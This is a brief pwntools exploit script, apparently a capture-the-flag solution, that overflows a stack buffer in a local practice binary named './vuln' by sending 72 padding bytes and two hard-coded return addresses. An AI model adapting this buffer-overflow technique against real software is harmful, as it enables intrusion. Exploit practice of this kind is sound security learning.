#!/usr/bin/env python

from pwn import *

r = process("./vuln")

r.recvuntil("Welcome to 64-bit. Can you match these numbers?\n")
payload = (
    "A" * 72 +
    p64(0x4008b1) +
    p64(0x40084d)
)
r.sendline(payload)
print(r.recvall())

r.close()
